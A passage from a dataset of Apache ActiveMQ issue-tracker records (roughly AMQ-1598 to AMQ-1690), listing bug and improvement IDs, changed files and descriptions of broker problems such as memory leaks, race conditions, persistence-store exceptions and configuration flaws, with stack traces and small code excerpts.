changed files:
texts:Upgrade to Jettison 1.0
1.0 final is released with a lot of bug fixes, along with the one that caused problems with transforming map messages.
issueID:AMQ-1598
type:Bug
changed files:ProducerEventSource.java
texts:Extraneous Thread.dumpStack() method in ProducerEventSource.java
There is an extraneous Thread.dumpStack() call in activemq-core/src/main/java/org/apache/activemq/advisory/ProducerEventSource.java.I"ve attached a patch to fix this.
issueID:AMQ-1606
type:Bug
changed files:BrokerService.java
RegionBroker.java
TempQueueRegion.java
ManagedTempQueueRegion.java
DestinationFactoryImpl.java
Topic.java
Queue.java
ManagedRegionBroker.java
BaseDestination.java
texts:The Producer MemoryLimit can lead to network deadlock when spooling is disabled.
None
issueID:AMQ-1607
type:Improvement
changed files:TransportFactory.java
texts:Static method to register TransportFactory
Need static method:public static TransportFactory.registerTransportFactory(String scheme, TransportFactory tf) {  TRANSPORT_FACTORYS.put(scheme, tf);}This would allow registering new transport factories without the need of writing META-INF classes.
issueID:AMQ-1613
type:Bug
changed files:FailoverTransport.java
texts:Inactivity monitor blocks trying to close out a Failover transport that is in the middle of send.
The net affect of this is that clients don"t get reconnected within the inactivity monitor configured time.  They have to wait for the OS socket to notice the connection failure to reconnect.  This in effect is making the inactivity monitor in-effective for heavily used connections.
issueID:AMQ-1614
type:Improvement
changed files:AmqJNDIPooledConnectionFactory.java
texts:PooledConnectionFactory not JNDI refereceable
The PooledConnectionFactory does not extend JNDIBaseStorable neither implements JNDIStorableInterface which makes it impossible to store it in a JNDI tree. It is not a problem when using Spring, but when using for example Tomcat and context.xml as configuration it simply does not work.Attaching a simple fix on how this can be resolved.
issueID:AMQ-1616
type:Bug
changed files:ActiveMQConnection.java
texts:JMS Compliance - Closing a closed connection should not throw an exception
According to the JMS Spec, section 4.3.5, "Closing a closed connection must NOT throw an exception."
issueID:AMQ-1618
type:Bug
changed files:ServerSessionPoolImpl.java
texts:Improper handling of container restrictions in creation of sessions
In the getServerSession() method of org.apache.activemq.ra.ServerSessionPoolImpl there is an issue with the code block given below ServerSessionImpl ss = createServerSessionImpl();            // We may not be able to create a session due to the container            // restricting us.            if (ss == null) {                if (idleSessions.size() == 0) {                    throw new JMSException("Endpoint factory did not allows to any endpoints.");                }                return getExistingServerSession();            }If the container restricts the creation of a session then messages should be queued to an existing session. So the check should be                 if (activeSessions.size() == 0) {                    throw new JMSException("Endpoint factory did not allows to any endpoints.");                }instead of the one above
issueID:AMQ-1620
type:Bug
changed files:CompositeDestinationFilter.java
texts:compositeTopic changing destination field of original message
When using compositeTopics to copy messages from one destination to multiple queues or topics, and setting forwardOnly="false", messages sent out on the original topic will have the destination field set to the last forwarded topic/queue name.  For example, using this config:<compositeTopic name="original.topic" forwardOnly="false">    <forwardTo>        <queue physicalName="forwarded.queue" />        <topic physicalName="forwarded.topic" />    </forwardTo></compositeTopic>Messages sent out on the original.topic topic will have "forwarded.topic" set as their destination.My stomp client (activemessaging) uses the destination field to route messages locally after they are received, so this causes big problems for me.I have attached a patch that fixes this behavior.
issueID:AMQ-1621
type:Bug
changed files:JmsConnector.java
texts:JmsConnector does not remove bridges
The removeInboundBridge and removeOutboundBridge methods both add instead of remove!  I"ve attached a patch to fix this.  It also adds a method for clearing the bridges, which I use in my own code.  Hopefully it isn"t asking to much to have that method added as well.
issueID:AMQ-1622
type:Bug
changed files:
texts:Enqueue and dequeue counts swapped on admin web console
When viewing the topics and queue listings in the web admin console, the dequeue count is displayed with the heading "Messages Received", and enqueue is displayed with the heading "Messages Sent".That seems backwards to me.  When looking at statistics for a queue, I would assume that "Messages Sent" are messages sent from the queue (dequeueCount), and "Messages Received" are messages received by the queue (enqueueCount).Here"s a patch that swaps them.
issueID:AMQ-1623
type:Bug
changed files:KahaTopicReferenceStore.java
ContainerKeySetIterator.java
KahaReferenceStore.java
texts:KahaMessageStore does not close or delete files for deleted destinations.
When a persistent destination is deleted via the web console or JMX, the file remains on disk and remains open, tying up a file descriptor.I discovered this trying to run some stress tests that create and delete queues and topics for different tests, but it runs out of file descriptors and crashes when using the KahaMessageStore.I started to look into this and I saw that the Topic or Queue dispose method calls MessageStore.removeAllMessages, but I think to clean things up properly you"d have to add a MessageStore.dispose to do any necessary cleanup.
issueID:AMQ-1624
type:Bug
changed files:
texts:Fileserver webapp wont work out of the box
After a normal build, the blob-message fileserver webapp dosn"t work.The classes necessary for file-upload will are not included.The patch include the class-files from fileserver module to the assambly and insert the essential block to the activemq.xml
issueID:AMQ-1629
type:Bug
changed files:DemandForwardingBridgeSupport.java
texts:wildcards don&#39;t work in networkconnector excludeDestinations
Version: 5.0 We have a simple setup to test excludedDestinations config ...We are using the broker and  example producer & consumer from the binary distribution (broker instances A & B are on different hosts Setup: producer &#8212; A ---- B--- consumer Broker A"s activemq.xml has the following for NC config (everythingelse is the same as in the orig config file):    <networkConnectors>       <networkConnector name="toB" uri="static://(tcp://B.foo.com:61616)">            <excludedDestinations>                 <queue physicalName="TEST.>" />            </excludedDestinations>      </networkConnector>     </networkConnectors> Issue: consumer attached to Broker B sees all the messages sent to TEST.FOO (the default messages generated by the producer)We noticed that none of the queue or topic wildcards work, only specific topic or queue names work in the exclusion. However, http://activemq.apache.org/networks-of-brokers.html states "N.B. You can use wildcards in inclusive , exclusive destination properties". Are we missing anything ? Thanks  Sridhar
issueID:AMQ-1631
type:Bug
changed files:ActiveMQMessageConsumer.java
texts:Concurrency Issue in MessageConsumer&#39;s deliveredMessages within dispose
The LinkedList can be modified concurrently - see http://www.nabble.com/NPE-while-consuming-messages-to12301153s2354.html
issueID:AMQ-1635
type:Improvement
changed files:
texts:Remove unused references to backport-util-concurrent
Since ActiveMQ 5.0 requires Java 1.5 there is no need to use backport-util-concurrent anymore.  All of the dependencies have already been removed. This patch is just for additional cleanup.
issueID:AMQ-1636
type:Improvement
changed files:ActiveMQConfiguration.java
texts:the ActiveMQ camel component should default to using a SingleConnectionFactory to avoid creating tons of connections when sending messages in Camel - or support PooledConnectionFactory if enabled
See the thread describing this problem: http://www.nabble.com/Getting-lots-of-TIME_WAIT-sockets-tp16119896s22882p16119896.html
issueID:AMQ-1639
type:Improvement
changed files:
texts:Include unix startup scripts in the Windows .zip build
The more recent versions of ActiveMQ do only come with one bin/activemq batch/script file, depending on the platform they were built for. I.e. for Windows there is only an activemq.bat and no equivalent unix shell script anymore (bin/activemq). Looks like a good idea at first, however I (and surely other) use ActiveMQ on Windows from cygwin and so far I have appreciated also having a unix shell script for starting ActiveMQ on Windows. So I suggest including the Unix shell script bin/activemq in the Windows build of ActiveMQ. Not sure if it makes sense the other way around (include activemq.bat in the .tar.gz file). Perhaps it does when considering virtualization.
issueID:AMQ-1640
type:Test
changed files:
texts:variant of DeadLetterTest with message listener
exercise the DeadLetterTest with a message listener, was failing intermittently with out of order messages but seems to work now. Will serve as a regression test.
issueID:AMQ-1645
type:Improvement
changed files:
texts:Change default client URL to be failover://tcp://localhost:61616
change default URL to be failover://tcp://locahost:61616 instead of tcp://localhost:61616
issueID:AMQ-1646
type:Improvement
changed files:ActiveMQSession.java
ActiveMQConnectionFactory.java
ActiveMQConnection.java
ActiveMQXAConnection.java
texts:Change dispatchAsync = true for clients by default
By default, non-persistent clients (topics) will be dispatched messages from the broker by the same thread that received them from the producer. This means that a slow consumer will slow the overallthroughput for any clients receiving messages from that producer. By having dispatchAsync=true as the default, consumers will be decoupled from the producer.
issueID:AMQ-1647
type:Bug
changed files:
texts:PooledTaskRunner fails to shutdown after task throws exception
the PooledTaskRunner will fail to shutdown if a task throws an exception, because the state-tracking variables are never reset.patch and unit test attached.
issueID:AMQ-1650
type:Bug
changed files:AMQPersistenceAdapter.java
texts:AmqPersistenceAdapter throws java.io.IOException: Failed to read to journal for: offset
Using durable consumers with multiple topics - can occasionally see this timing issue:Caused by: java.io.IOException: Failed to read to journal for: offset = 17883251, file = 2, size = 0, type = 0. Reason: java.io.IOException: Invalid location: offset = 17883251, file = 2, size = 0, type = 0, : java.lang.NegativeArraySizeException at org.apache.activemq.util.IOExceptionSupport.create(IOExceptionSupport.java:33) at org.apache.activemq.store.amq.AMQPersistenceAdapter.createReadException(AMQPersistenceAdapter.java:597) at org.apache.activemq.store.amq.AMQPersistenceAdapter.readCommand(AMQPersistenceAdapter.java:483) at org.apache.activemq.store.amq.AMQMessageStore.getMessage(AMQMessageStore.java:431) at org.apache.activemq.store.amq.RecoveryListenerAdapter.recoverMessageReference(RecoveryListenerAdapter.java:54) at org.apache.activemq.store.kahadaptor.KahaReferenceStore.recoverReference(KahaReferenceStore.java:80) at org.apache.activemq.store.kahadaptor.KahaTopicReferenceStore.recoverNextMessages(KahaTopicReferenceStore.java:285) at org.apache.activemq.store.amq.AMQTopicMessageStore.recoverNextMessages(AMQTopicMessageStore.java:62) at org.apache.activemq.broker.region.cursors.TopicStorePrefetch.doFillBatch(TopicStorePrefetch.java:106) at org.apache.activemq.broker.region.cursors.AbstractStoreCursor.fillBatch(AbstractStoreCursor.java:185) ... 27 moreCaused by: java.io.IOException: Invalid location: offset = 17883251, file = 2, size = 0, type = 0, : java.lang.NegativeArraySizeException at org.apache.activemq.kaha.impl.async.DataFileAccessor.readRecord(DataFileAccessor.java:95) at org.apache.activemq.kaha.impl.async.AsyncDataManager.read(AsyncDataManager.java:585) at org.apache.activemq.store.amq.AMQPersistenceAdapter.readCommand(AMQPersistenceAdapter.java:480) ... 34 more
issueID:AMQ-1651
type:Bug
changed files:ActiveMQSession.java
texts:Sending message to deleted TemporaryQueue throws JMSException instead of IllegalDestinationException
When sending a message to a deleted TemporaryQueue, a JMSException is thrown at ActiveMQSession.java:1583.According to the JMS 1.1 spec, section 7.3 Standard Exceptions, an IllegalDestinationException should be thrown instead:InvalidDestinationException: This exception must be thrown when adestination is either not understood by a provider or is no longer valid.
issueID:AMQ-1654
type:Bug
changed files:BrokerService.java
MirroredQueue.java
texts:Mirror Topics for temorary queues
when Mirror queues are enabled AMQ is creating mirror queues for all the temp queues created to fulfill the transactions. But when temp queues are removed by the broker because the transaction is complete, the Mirror queues/topics are still there, they should be removed as well. There should be a configuration setting to turn on/ turn off mirror topic/queues support for temp queues. There got to be some overhead in AMQ to maintain a lot of mirror queues for temporary queues where there are millions of transaction.
issueID:AMQ-1656
type:Bug
changed files:StubBroker.java
MutableBrokerFilter.java
RegionBroker.java
Topic.java
Queue.java
Broker.java
ErrorBroker.java
EmptyBroker.java
BrokerFilter.java
BaseDestination.java
texts:Messages are sometimes skipped when  using JDBC master/slave
Sometime, a (or some) message(s) hang in the queue while no consumer eat it. It happen more often a failover.Scenario:2 brokers (jdbc master/slave), 2 consumers (with prefetch set to 1), 2 producersProducers :  ant producer -Durl="failover:(tcp://localhost:61618,tcp://localhost:61619)" -Ddurable=true -Dmax=500Consumer 1:  ant consumer -Durl="failover:(tcp://localhost:61618,tcp://localhost:61619)" -Dmax=10000 -DclientId=c1Consumer 2:  ant consumer -Durl="failover:(tcp://localhost:61618,tcp://localhost:61619)" -Dmax=10000 -DclientId=c21 - Start the two brokers (one will be master, the other will be slave)2 - Start the producers, consumers3 - Wait a little,4 - Kill the master -> slave become master5 - Producers continue producing, consumers continue consuming6 - After all producers finish their task, the consumer will finish consuming, and sometimes there still messages left in the queue (in the database, and using JMX to see the state of the queue).7 - Restart a new broker, kill the master8 - The messages will be consumed There is a race condition between the time the message is set with the broker sequence number (RegionBroker.java in send method), and the time it is actually put in the database (DefaultJDBCAdapter.java in doAddMessage method).I have seen that sometimes message with higher sequence number are put in database before a lower sequence number.  For example: 386 is put in the database before 385. If it is happening when JDBCMessageStore is recovering the next message (lastMessageId is 384), then 386 will be fetched and the lastMessageId will change to be 386. 385 is then put in the db but never retrieved (stopping and restarting the broker will allow to retrieve the message because at start the lastMessageId is -1).I have synchronized the code inside the RegionBroker.send, and I don"t have gaps anymore. This is a workaround for us since we don"t process a lot of message. But maybe a more elegant solution is to set the brokerSequenceId in doAddMessage of JDBCAdapter (I may be wrong, I didn"t check if the brokerSequenceId is used elsewhere).
issueID:AMQ-1659
type:Bug
changed files:
texts:SSL Transport configured in wantClientAuth mode never asks for the client certificate during the SSL Handshake
See: http://java.sun.com/javase/6/docs/api/javax/net/ssl/SSLServerSocket.html#setWantClientAuth(boolean)"A socket"s client authentication setting is one of the following: client authentication required client authentication requested no client authentication desired"In the API it indicates that if you call either setWantClientAuth, or setNeedClientAuth it will override the call to the other.Therefor I believe the following code only allows for ActiveMQ to be in two states: Client Authentication Required (needClientAuth==true) No client Authentication Desired (needClientAuth==false)activemq-core/src/main/java/org/apache/activemq/transport/tcp/SslTransportServer.javaAs setWantClientAuth is overridden by setNeedClientAuth.public void bind() throws IOException {  super.bind();  ((SSLServerSocket)this.serverSocket).setWantClientAuth(wantClientAuth);  ((SSLServerSocket)this.serverSocket).setNeedClientAuth(needClientAuth);}I believe this the same issue as this Jetty issue: http://jira.codehaus.org/browse/JETTY-86
issueID:AMQ-1661
type:Bug
changed files:ActiveMQSession.java
Message.java
texts:Duplicate messages and extra network traffic with duplex connections
(see attached diagram)I have two brokers A and B, where A establishes a connection to B with the options: duplex="true" networkTTL="3" dynamicOnly="true" I have two clients connecting to broker A, and one to B.  One of the clients on A is subscribing to a queue, the other is publishing to it.  The client on B is not using that queue at all.  When the publishing client sends a message, the subscriber receives it as expected.  But if I watch the network with a sniffer, I can see the message being sent to broker B and back again. I also set up a topic that all of the clients subscribe to.  If a client on A sends a message to the topic, the client on B receives it normally, but the two clients on A receive the message twice.  I can see with the sniffer that the message is being sent from A to B and back. If I change the connection so that it"s not duplex (i.e. I set up matching simplex connections on both brokers) all of this unexpected behavior goes away.  In the first example, the messages are no longer forwarded to B since there are no subscribers on that broker.  In the second example, the message is received once by every subscriber. I have tested on various 5.1 snapshots up through 4/8/08.
issueID:AMQ-1664
type:Improvement
changed files:Retailer.java
Vendor.java
Supplier.java
build.xml
README.txt
TransactionsDemo.java
texts:Example illustrating trasactions
There is a lack of quality demos/samples/examples/etc. in ActiveMQ.I"ve implemented one illustrating the use of transactions and synchronous/asynchronous receiving of messages that I"d like to have considered for inclusion.
issueID:AMQ-1665
type:Test
changed files:
texts:SslBrokerTest that verifies the programetic setting of truststore etc and negates the need to use javax.net.ssl. system props
Additional test case that demonstrates/verifies programetically setting jsse properties using the SslTransportFactory and SslBrokerService. This will work nicely for an embedded broker.
issueID:AMQ-1666
type:Bug
changed files:VMTransportFactory.java
texts:connection URI options not applied to both sides of VM transport
when connecting over the VM transport, specifying vm://localhost?async=false results in the "async" flag being sent to false on one side of the transport only.the supplied patch ensures that all options are applied to the peer as well.
issueID:AMQ-1667
type:Bug
changed files:HashPageInfo.java
HashPage.java
HashIndex.java
texts:AMQ message store throws IllegalStateException/IndexOutOfBoundsExceptions (5.1)
In 5.1RC3, when doing a durable subscription test, only about 100~ messages get sent, then IndexOutOfBoundsExceptions start to occur when messages are sent. Only the first 100~ messages are received by the first durable subscriber. I can reproduce this error reliably. I will work on packaging a test program to demonstrate this error.Stacktrace: 2008-04-16 14:09:32,357 &#91;topic://testSub&#93; WARN  AMQMessageStore                - Message could not be added to long term store: Trying to access an inactive page: 999424java.lang.IllegalStateException: Trying to access an inactive page: 999424 at org.apache.activemq.kaha.impl.index.hash.HashIndex.lookupPage(HashIndex.java:283) at org.apache.activemq.kaha.impl.index.hash.HashPageInfo.begin(HashPageInfo.java:95) at org.apache.activemq.kaha.impl.index.hash.HashBin.getRetrievePage(HashBin.java:260) at org.apache.activemq.kaha.impl.index.hash.HashBin.getHashEntry(HashBin.java:236) at org.apache.activemq.kaha.impl.index.hash.HashBin.remove(HashBin.java:164) at org.apache.activemq.kaha.impl.index.hash.HashIndex.remove(HashIndex.java:246) at org.apache.activemq.kaha.impl.container.MapContainerImpl.remove(MapContainerImpl.java:324) at org.apache.activemq.kaha.impl.container.MapContainerImpl.place(MapContainerImpl.java:401) at org.apache.activemq.store.kahadaptor.TopicSubContainer.add(TopicSubContainer.java:62) at org.apache.activemq.store.kahadaptor.KahaTopicReferenceStore.addMessageReference(KahaTopicReferenceStore.java:95) at org.apache.activemq.store.amq.AMQMessageStore$4.execute(AMQMessageStore.java:385) at org.apache.activemq.util.TransactionTemplate.run(TransactionTemplate.java:44) at org.apache.activemq.store.amq.AMQMessageStore.doAsyncWrite(AMQMessageStore.java:374) at org.apache.activemq.store.amq.AMQMessageStore.asyncWrite(AMQMessageStore.java:341) at org.apache.activemq.store.amq.AMQMessageStore$1.iterate(AMQMessageStore.java:95) at org.apache.activemq.thread.DedicatedTaskRunner.runTask(DedicatedTaskRunner.java:98) at org.apache.activemq.thread.DedicatedTaskRunner$1.run(DedicatedTaskRunner.java:36)Later stacktraces look like this:2008-04-16 14:09:33,140 &#91;topic://testSub&#93; WARN  AMQMessageStore                - Message could not be added to long term store: Index: 1, Size: 1java.lang.IndexOutOfBoundsException: Index: 1, Size: 1 at java.util.ArrayList.RangeCheck(ArrayList.java:547) at java.util.ArrayList.get(ArrayList.java:322) at org.apache.activemq.kaha.impl.index.hash.HashPage.getHashEntry(HashPage.java:194) at org.apache.activemq.kaha.impl.index.hash.HashPageInfo.getHashEntry(HashPageInfo.java:77) at org.apache.activemq.kaha.impl.index.hash.HashBin.getHashEntry(HashBin.java:239) at org.apache.activemq.kaha.impl.index.hash.HashBin.remove(HashBin.java:164) at org.apache.activemq.kaha.impl.index.hash.HashIndex.remove(HashIndex.java:246) at org.apache.activemq.kaha.impl.container.MapContainerImpl.remove(MapContainerImpl.java:324) at org.apache.activemq.kaha.impl.container.MapContainerImpl.place(MapContainerImpl.java:401) at org.apache.activemq.store.kahadaptor.TopicSubContainer.add(TopicSubContainer.java:62) at org.apache.activemq.store.kahadaptor.KahaTopicReferenceStore.addMessageReference(KahaTopicReferenceStore.java:95) at org.apache.activemq.store.amq.AMQMessageStore$4.execute(AMQMessageStore.java:385) at org.apache.activemq.util.TransactionTemplate.run(TransactionTemplate.java:44) at org.apache.activemq.store.amq.AMQMessageStore.doAsyncWrite(AMQMessageStore.java:374) at org.apache.activemq.store.amq.AMQMessageStore.asyncWrite(AMQMessageStore.java:341) at org.apache.activemq.store.amq.AMQMessageStore$1.iterate(AMQMessageStore.java:95) at org.apache.activemq.thread.DedicatedTaskRunner.runTask(DedicatedTaskRunner.java:98) at org.apache.activemq.thread.DedicatedTaskRunner$1.run(DedicatedTaskRunner.java:36)
issueID:AMQ-1669
type:Bug
changed files:AsyncDataManager.java
texts:AMQ Journal data files never deleted - exception in consolidateDataFilesNotIn()
see: http://www.nabble.com/AMQ-Journal-data-files-never-deleted-to16728103s2354.html#a16728103Exception is:Exception in thread "ActiveMQ Scheduler" java.util.ConcurrentModificationExceptionat java.util.HashMap$HashIterator.nextEntry(HashMap.java:787)at java.util.HashMap$KeyIterator.next(HashMap.java:823)at java.util.AbstractSet.removeAll(AbstractSet.java:143)at org.apache.activemq.kaha.impl.async.AsyncDataManager.consolidateDataFilesNotIn(AsyncDataManager.java:404)at org.apache.activemq.store.amq.AMQPersistenceAdapter.cleanup(AMQPersistenceAdapter.java:417)at org.apache.activemq.store.amq.AMQPersistenceAdapter$3.run(AMQPersistenceAdapter.java:269)at org.apache.activemq.thread.SchedulerTimerTask.run(SchedulerTimerTask.java:33)at java.util.TimerThread.mainLoop(Timer.java:512)at java.util.TimerThread.run(Timer.java:462)
issueID:AMQ-1670
type:Bug
changed files:
texts:Element Order in the XSD do not match the order required by ActiveMQ
The transports element in the activemq configuration must be one of the last element configured..  Some elements if specified after it, it will be ignored.  The problem is that the xbean generated xsd orders the elements alphabetically.We either need fix the xsd to mach the requirement or remove the restriction that the transport element be one of the last elements defined.
issueID:AMQ-1672
type:Bug
changed files:
texts:Mirror Queues on Temp Queues is causing Memory leak
Having Mirror queues turned on AMQ, creates the mirror queue for all the TEMP queues gets created. TEMP queues gets destroyed when the transaction is over but Mirror queues never goes away. after a long test (creating around 100K transactions) MIRROR queues caused memory problem in AMQ. TEMP queues were all removed appropriately. When looked at the JConsole there are all those MIRROR queue treads for the TEMP queues in the wait state.
issueID:AMQ-1673
type:Improvement
changed files:
texts:Change XML namespace to be based off http://activemq.apache.org/schema
None
issueID:AMQ-1674
type:Bug
changed files:KahaReferenceStore.java
texts:Default Persistence fails / MDBs stop processing in JBoss 4.2.2.GA
After a number of messages are delivered, the following error is encountered, and the consumer stops consuming (with variable IDs) :14:37:02,825 ERROR &#91;RecoveryListenerAdapter&#93; Message id ID:servername-01-48018-1201289318807-2:430:1:1:1 could not be recovered from the data store!This can be reproduced by building the jar via ant from the included tar.gz with exploded rar and jms data source. In order to produce, deploy rar,jar, and data source, and post some large number (>100000 works for me reliably) as a text message to PostingQueue. and it will post that many object messages to the ReportLogMDBQueue, which will eventually produce the error.
issueID:AMQ-1677
type:Improvement
changed files:
texts:switch to using the finer grained Spring jars
rather than the big-honking spring jar
issueID:AMQ-1678
type:Bug
changed files:
texts:JMX methods exposed for a Queue dont work right
I noticed that JMX methods exposed from AMQ5.0 are not working properly. some times able to move/copy messages and sometime don"t. its really unreliable. QueueBrowser is not working properly either, it returns no messages when u browse the queue even if messages are there in the queue.
issueID:AMQ-1681
type:Bug
changed files:Topic.java
Queue.java
TempTopic.java
TempQueue.java
texts:Memory leak when creating large numbers of TemporaryQueues (Log4J related)
When using an embedded broker and using Log4J, there is a memory leak in the broker for each new TemporaryQueue created.This seems to be the offending code (taken from 5.0.0-release source):org.apache.activemq.broker.region.Queue:    public Queue(Broker broker, ActiveMQDestination destination, final SystemUsage systemUsage, MessageStore store, DestinationStatistics parentStats,                 TaskRunnerFactory taskFactory, Store tmpStore) throws Exception {        ... skipped....        // let"s copy the enabled property from the parent DestinationStatistics        this.destinationStatistics.setEnabled(parentStats.isEnabled());        destinationStatistics.setParent(parentStats);        this.log = LogFactory.getLog(getClass().getName() + "." + destination.getPhysicalName());    }What happens here is that for each new TemporaryQueue created a new log instance is created with rather large string as it"s name.This instance is unique for each new TemoraryQueue and because of the way Log4J handles those instances, it is never removed once initalized.We hit this bug when we were testing performance together with Spring-based synchronous JMS API, which is implemented in such a way that for each new message it creates a new TemporaryQueue. We got OutOfMemory after about 40000 messages with 128M heap.I am not sure what this special log instance is used for, but assuming it"s not very important, it will be easy to fix this bug with just using some predefined log name always.
issueID:AMQ-1683
type:Bug
changed files:KahaTopicReferenceStore.java
KahaReferenceStoreAdapter.java
StoreDurableSubscriberCursor.java
HashPageInfo.java
LinkedNode.java
HashBin.java
HashIndex.java
texts:possible dynamic instability in AMQStore indexes
Due to incorrect assignment of index names - an index physical file can be shared between different durable subscribers - which leads to a dynamic instability of the underlying index - with undefined results.
issueID:AMQ-1685
type:Bug
changed files:
texts:activemq-admin start does not work on windows.
None
issueID:AMQ-1686
type:Bug
changed files:
texts:Small window in wakeup logic for PooledTaskRunner - task can get executed in parallell
org.apache.activemq.broker.region.cursors.CursorDurableTest fails on windows sometimes with the error:Exception in thread "Persistence Adaptor Task" java.lang.NullPointerException        at org.apache.activemq.store.amq.AMQMessageStore$4.execute(AMQMessageStore.java:381)        at org.apache.activemq.util.TransactionTemplate.run(TransactionTemplate.java:44)        at org.apache.activemq.store.amq.AMQMessageStore.doAsyncWrite(AMQMessageStore.java:374)        at org.apache.activemq.store.amq.AMQMessageStore.asyncWrite(AMQMessageStore.java:341)        at org.apache.activemq.store.amq.AMQMessageStore$1.iterate(AMQMessageStore.java:95)        at org.apache.activemq.thread.PooledTaskRunner.runTask(PooledTaskRunner.java:122)        at org.apache.activemq.thread.PooledTaskRunner$1.run(PooledTaskRunner.java:43)        at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:650)        at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:675)        at java.lang.Thread.run(Thread.java:595)Tests run: 1, Failures: 1, Errors: 0, Skipped: 0, Time elapsed: 303.672 sec <<< FAILURE!The problem appears to be in the interaction between wakup and runTask in PooledTaskRunneriterating is set to false in a finally  and queued is checked in a separate sync block.if wakeup is called in this window, it can set queued and find iterating false so it will execute, and runTask will find queued true and it too will execute.the fix is to include the queued check in the finally block so that iterating and queued are checked at the same time. I will attach a patch with this fix.I attempted to reproduce this problem with a unit test but I did not have any real success. the window is quite small. I will include the unit test in case it can be improved upon.chirino merged a fix yesterday that addresses the symptom of this issue in a different way,http://svn.apache.org/viewvc?view=rev&revision=650956The added synchronisation means that parallel calls by the PooledTaskRunner.asyncWrite are serialised on the method access.This fix addresses the route cause and can negate the need for the synchronisation.fyi: In the test, the paralell calls can come from flush() and from the asyncWrite task.
issueID:AMQ-1687
type:Bug
changed files:
texts:Error with virtual topic with more than one consumer name
Tried upgrading to 5.1 today.  Seems virtual topics are broken with more than one different consumer name/queue.  This is a show-stopper for us as we"re using this feature fairly heavily in 4.1 (with some issues, but none like this).ERROR Service                        - Async error occurred: java.lang.ClassCastException: org.apache.activemq.broker.region.Topic cannot be cast to org.apache.activemq.broker.region.Queuejava.lang.ClassCastException: org.apache.activemq.broker.region.Topic cannot be cast to org.apache.activemq.broker.region.Queue        at org.apache.activemq.broker.region.QueueSubscription.acknowledge(QueueSubscription.java:50)        at org.apache.activemq.broker.region.PrefetchSubscription.acknowledge(PrefetchSubscription.java:224)        at org.apache.activemq.broker.region.AbstractRegion.acknowledge(AbstractRegion.java:359)        at org.apache.activemq.broker.region.RegionBroker.acknowledge(RegionBroker.java:470)        at org.apache.activemq.broker.TransactionBroker.acknowledge(TransactionBroker.java:194)        at org.apache.activemq.broker.BrokerFilter.acknowledge(BrokerFilter.java:73)        at org.apache.activemq.broker.BrokerFilter.acknowledge(BrokerFilter.java:73)        at org.apache.activemq.broker.MutableBrokerFilter.acknowledge(MutableBrokerFilter.java:84)        at org.apache.activemq.broker.TransportConnection.processMessageAck(TransportConnection.java:443)        at org.apache.activemq.command.MessageAck.visit(MessageAck.java:196)        at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:292)        at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:180)        at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:68)        at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:143)        at org.apache.activemq.transport.InactivityMonitor.onCommand(InactivityMonitor.java:206)        at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:84)        at org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:196)        at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:183)        at java.lang.Thread.run(Thread.java:619)This can be reproduced by modifying the existing VirtualTopicPubSubTest as attached (have two different consumer names).  I could not get it to error with an internal broker.  The easiest way to reproduce is to start an external broker and then run the attached test.  It seems to be important that the broker start clean.
issueID:AMQ-1689
type:Improvement
changed files:
texts:(NIO)DataFileAppender does to many sync or force calls when there is little or no concurrency
Where NIO channel force and fileDescriptor.sync perform poorly and there is little concurrently, the kaha DataFileAppender performs poorly.A test case where a single producer and consumer operate from either ends of a networked pair of brokers shows the problem. It takes ~3 minutes to send 1000 messages on windows!. The problem is that 70% of the time is spent in NIO channel.flush()The flush is batched if there are concurrent writes, but otherwise, a single write is flushed immediately.My proposal is to have the batch processor batch till a batch is full or till a sync flag is present in a write command or till some timeout expires or if the appender is closed.This reduces the number of force calls and with this change, my test case can do 1000 messages in ~1minute.
issueID:AMQ-1690
type:Improvement
changed files:BrokerService.java
texts:QuickJPAStoreRecoveryBrokerTest.testQueueNonPersistentMessagesLostOnRestart sometimes fails, timing issue with broker shutdown
QuickJPAStoreRecoveryBrokerTest.testQueueNonPersistentMessagesLostOnRestart can fail with the stack trace below.the problem is that the vmtransport can be persisting data while the broker is attempting to close the persistence adapter.The brokerService has a comment to have the VMTransport shuts down after the services, but puts it last of all. Moving the shutdown of the vmtransport to just before the persistence adapter shutdown works better for this test case.&#91;08:16:01&#93;: org.apache.activemq.broker.store.QuickJPAStoreRecoveryBrokerTest (21s)&#91;08:16:01&#93;: &#91;org.apache.activemq.broker.store.QuickJPAStoreRecoveryBrokerTest&#93; testTopicDurableConsumerHoldsPersistentMessageAfterRestart (1s)&#91;08:16:01&#93;: &#91;testTopicDurableConsumerHoldsPersistentMessageAfterRestart&#93;&#91;08:16:01&#93;: &#91;testTopicDurableConsumerHoldsPersistentMessageAfterRestart&#93; &openjpa-1.0.0-r420667:568756 nonfatal user error& org.apache.openjpa.persistence.InvalidStateException: This operation failed for some instances. See the nested exceptions array for details.at org.apache.openjpa.kernel.AbstractBrokerFactory.assertNoActiveTransaction(AbstractBrokerFactory.java:696)at org.apache.openjpa.kernel.AbstractBrokerFactory.close(AbstractBrokerFactory.java:373)at org.apache.openjpa.kernel.DelegatingBrokerFactory.close(DelegatingBrokerFactory.java:183)at org.apache.openjpa.persistence.EntityManagerFactoryImpl.close(EntityManagerFactoryImpl.java:286)at org.apache.activemq.store.jpa.JPAPersistenceAdapter.stop(JPAPersistenceAdapter.java:198)at org.apache.activemq.store.amq.AMQPersistenceAdapter.stop(AMQPersistenceAdapter.java:307)at org.apache.activemq.util.ServiceStopper.stop(ServiceStopper.java:41)at org.apache.activemq.broker.BrokerService.stop(BrokerService.java:484)at org.apache.activemq.broker.BrokerTestSupport.tearDown(BrokerTestSupport.java:101)at junit.framework.TestCase.runBare(TestCase.java:130)at org.apache.activemq.CombinationTestSupport.runBare(CombinationTestSupport.java:90)at junit.framework.TestResult$1.protect(TestResult.java:106)at junit.framework.TestResult.runProtected(TestResult.java:124)at junit.framework.TestResult.run(TestResult.java:109)at junit.framework.TestCase.run(TestCase.java:118)at junit.framework.TestSuite.runTest(TestSuite.java:208)at junit.framework.TestSuite.run(TestSuite.java:203)at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)at 